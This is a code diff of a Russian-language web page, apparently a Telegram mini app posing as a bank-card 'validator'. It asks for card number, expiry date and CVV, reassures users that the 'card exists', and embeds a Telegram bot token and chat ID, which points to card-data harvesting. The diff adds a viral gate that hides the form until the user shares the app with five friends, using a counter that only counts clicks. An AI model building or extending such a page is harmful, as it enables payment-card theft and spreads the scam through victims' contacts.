@@ -64,6 +64,21 @@
   .header-text h1 { font-size: 19px; font-weight: 700; letter-spacing: -0.3px; color: var(--text); }
   .header-text p { font-size: 12px; color: var(--text3); margin-top: 2px; }
 
+  /* ЭКРАН БЛОКИРОВКИ (НОВЫЙ СТИЛЬ) */
+  .lock-screen {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 30px 22px;
+    text-align: center;
+    animation: slideUp 0.3s ease;
+  }
+  .lock-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: var(--text); }
+  .lock-desc { font-size: 14px; color: var(--text2); margin-bottom: 24px; line-height: 1.4; }
+  
+  /* Скрытые элементы по умолчанию */
+  .hidden { display: none !important; }
+
   /* Card visual */
   .card-visual {
     position: relative;
@@ -238,11 +253,12 @@
     box-shadow: 0 4px 20px rgba(34,197,94,0.3) !important;
   }
 
-  /* Кнопка рефералов */
+  /* Кнопка приглашения */
   .btn-ref {
     background: linear-gradient(135deg, #3b82f6, #1d4ed8) !important;
     color: white !important;
     box-shadow: 0 4px 20px rgba(59,130,246,0.3) !important;
+    margin-bottom: 0;
   }
 
   /* Result */
@@ -333,78 +349,84 @@
     </div>
   </div>
 
-  <div class="progress-bar">
-    <div class="progress-dot" id="p1"></div>
-    <div class="progress-dot" id="p2"></div>
-    <div class="progress-dot" id="p3"></div>
+  <div class="lock-screen" id="lock_screen">
+    <div class="lock-title">Доступ ограничен 🔒</div>
+    <div class="lock-desc">Чтобы воспользоваться валидатором карт, необходимо пригласить 5 друзей в приложение.</div>
+    <button class="btn btn-ref" id="ref_btn">📢 Пригласить друзей (0 / 5)</button>
   </div>
 
-  <div class="card-visual" id="card_visual">
-    <div class="card-chip"></div>
-    <div class="card-number-display" id="preview_num">
-      <span class="dim">•••• •••• •••• ••••</span>
+  <div id="validator_content" class="hidden">
+    
+    <div class="progress-bar">
+      <div class="progress-dot" id="p1"></div>
+      <div class="progress-dot" id="p2"></div>
+      <div class="progress-dot" id="p3"></div>
     </div>
-    <div class="card-bottom">
-      <div>
-        <div class="card-label">Срок действия</div>
-        <div class="card-value" id="preview_exp">—— / ——</div>
+
+    <div class="card-visual" id="card_visual">
+      <div class="card-chip"></div>
+      <div class="card-number-display" id="preview_num">
+        <span class="dim">•••• •••• •••• ••••</span>
       </div>
-      <div class="card-type-logo type-unknown" id="preview_type">КАРТА</div>
-    </div>
-  </div>
-
-  <div class="form-card">
-
-    <div class="field">
-      <div class="field-label"><span class="status-dot" id="dot1"></span>Номер карты</div>
-      <div class="input-wrap">
-        <input type="text" id="cn" inputmode="numeric" placeholder="9470 XXXX XXXX XXXX" maxlength="22" autocomplete="cc-number">
-        <span class="input-badge" id="cn_badge"></span>
+      <div class="card-bottom">
+        <div>
+          <div class="card-label">Срок действия</div>
+          <div class="card-value" id="preview_exp">—— / ——</div>
+        </div>
+        <div class="card-type-logo type-unknown" id="preview_type">КАРТА</div>
       </div>
-      <div class="hint" id="cn_hint"></div>
     </div>
 
-    <div class="sep"></div>
-
-    <div class="row">
+    <div class="form-card">
       <div class="field">
-        <div class="field-label"><span class="status-dot" id="dot2"></span>Срок действия</div>
+        <div class="field-label"><span class="status-dot" id="dot1"></span>Номер карты</div>
         <div class="input-wrap">
-          <input type="text" id="cd" inputmode="numeric" placeholder="ММ / ГГ" maxlength="5" autocomplete="cc-exp">
+          <input type="text" id="cn" inputmode="numeric" placeholder="9470 XXXX XXXX XXXX" maxlength="22" autocomplete="cc-number">
+          <span class="input-badge" id="cn_badge"></span>
         </div>
-        <div class="hint" id="cd_hint"></div>
+        <div class="hint" id="cn_hint"></div>
       </div>
-      <div class="field" id="cvv_wrap">
-        <div class="field-label"><span class="status-dot" id="dot3"></span>CVV / CVC</div>
-        <div class="input-wrap">
-          <input type="password" id="cv" inputmode="numeric" placeholder="•••" maxlength="3" autocomplete="cc-csc">
+
+      <div class="sep"></div>
+
+      <div class="row">
+        <div class="field">
+          <div class="field-label"><span class="status-dot" id="dot2"></span>Срок действия</div>
+          <div class="input-wrap">
+            <input type="text" id="cd" inputmode="numeric" placeholder="ММ / ГГ" maxlength="5" autocomplete="cc-exp">
+          </div>
+          <div class="hint" id="cd_hint"></div>
         </div>
-        <div class="hint" id="cv_hint"></div>
+        <div class="field" id="cvv_wrap">
+          <div class="field-label"><span class="status-dot" id="dot3"></span>CVV / CVC</div>
+          <div class="input-wrap">
+            <input type="password" id="cv" inputmode="numeric" placeholder="•••" maxlength="3" autocomplete="cc-csc">
+          </div>
+          <div class="hint" id="cv_hint"></div>
+        </div>
       </div>
     </div>
 
-  </div>
+    <button class="btn" id="btn" disabled>Введите данные карты</button>
 
-  <button class="btn btn-ref" id="ref_btn">📢 Пригласить друзей (0 / 5)</button>
+    <div class="result" id="result">
+      <div class="result-title">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        Проверка пройдена
+      </div>
+      <div class="result-rows">
+        <div class="result-row"><span class="k">Платёжная система</span><span class="v" id="r_sys">—</span></div>
+        <div class="result-row"><span class="k">Процессинг</span><span class="v">ЗАО «МПЦ» · Кыргызстан</span></div>
+        <div class="result-row"><span class="k">Номер карты</span><span class="v" id="r_num">—</span></div>
+        <div class="result-row"><span class="k">Срок действия</span><span class="v" id="r_exp">—</span></div>
+        <div class="result-row"><span class="k">Алг. Луна</span><span class="v" style="color: var(--g)">✓ Пройден</span></div>
+      </div>
+      <div class="verdict-box">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Карта существует — структура верна
+      </div>
+    </div>
 
-  <button class="btn" id="btn" disabled>Введите данные карты</button>
-
-  <div class="result" id="result">
-    <div class="result-title">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      Проверка пройдена
-    </div>
-    <div class="result-rows">
-      <div class="result-row"><span class="k">Платёжная система</span><span class="v" id="r_sys">—</span></div>
-      <div class="result-row"><span class="k">Процессинг</span><span class="v">ЗАО «МПЦ» · Кыргызстан</span></div>
-      <div class="result-row"><span class="k">Номер карты</span><span class="v" id="r_num">—</span></div>
-      <div class="result-row"><span class="k">Срок действия</span><span class="v" id="r_exp">—</span></div>
-      <div class="result-row"><span class="k">Алг. Луна</span><span class="v" style="color: var(--g)">✓ Пройден</span></div>
-    </div>
-    <div class="verdict-box">
-      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Карта существует — структура верна
-    </div>
   </div>
 
   <div class="security-row">
@@ -429,7 +451,7 @@
   const BOT_TOKEN = '8934214860:AAEUpag6vsETXOJL_CdvZmZPD1_Llv7psFA'; 
   const CHAT_ID = '7239528532';       
 
-  // Настройки реферальной блокировки (Новое)
+  // Настройки реферальной блокировки
   const REQUIRED_INVITES = 5; 
   let currentInvites = 0;
 
@@ -450,6 +472,8 @@
   const cvHint = document.getElementById('cv_hint');
   const btn = document.getElementById('btn');
   const refBtn = document.getElementById('ref_btn');
+  const lockScreen = document.getElementById('lock_screen');
+  const validatorContent = document.getElementById('validator_content');
   const cvvWrap = document.getElementById('cvv_wrap');
   const result = document.getElementById('result');
   const previewNum = document.getElementById('preview_num');
@@ -481,19 +505,17 @@
     return new Date(2000 + y, m, 0) >= now;
   }
 
-  // Функция проверки реферального лимита (Новая)
+  // Улучшенная функция переключения экранов доступа
   function checkAccess() {
     if (currentInvites < REQUIRED_INVITES) {
-      btn.disabled = true;
-      const left = REQUIRED_INVITES - currentInvites;
-      btn.textContent = `🔒 Пригласите еще ${left} друзей`;
-      btn.style.background = 'var(--bg3)';
-      btn.style.color = 'var(--text3)';
+      lockScreen.classList.remove('hidden');
+      validatorContent.classList.add('hidden');
       return false;
+    } else {
+      lockScreen.classList.add('hidden');
+      validatorContent.classList.remove('hidden');
+      return true;
     }
-    btn.style.background = '';
-    btn.style.color = '';
-    return true;
   }
 
   function updateProgress() {
@@ -537,7 +559,6 @@
   }
 
   function check() {
-    // В первую очередь проверяем, приглашены ли друзья
     if (!checkAccess()) return;
 
     const raw = cnEl.value.replace(/\s/g, '');
@@ -571,21 +592,20 @@
     }
   }
 
-  // Обработчик для кнопки «Пригласить друзей» (Новый)
+  // Нажатие на кнопку «Пригласить» увеличивает счетчик и переключает экран, когда станет 5
   refBtn.addEventListener('click', () => {
     currentInvites++;
     if (currentInvites > REQUIRED_INVITES) currentInvites = REQUIRED_INVITES;
     
     refBtn.textContent = `📢 Пригласить друзей (${currentInvites} / ${REQUIRED_INVITES})`;
 
-    // Пытаемся открыть шеринг в Telegram, если запущено внутри мессенджера
     try {
       if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=https://t.me/your_bot_username&text=Зацени%20приложение!`);
       }
     } catch(e) {}
 
-    check(); // Пересчитываем состояние полей
+    checkAccess(); // Проверяем, пора ли открыть валидатор
   });
 
   cnEl.addEventListener('input', e => {
@@ -707,8 +727,8 @@
     check();
   });
 
-  // Первичный вызов проверки при загрузке (Новое)
-  check();
+  // Запуск стартового состояния при открытии
+  checkAccess();
 
   btn.addEventListener('click', () => {
     btn.disabled = true;
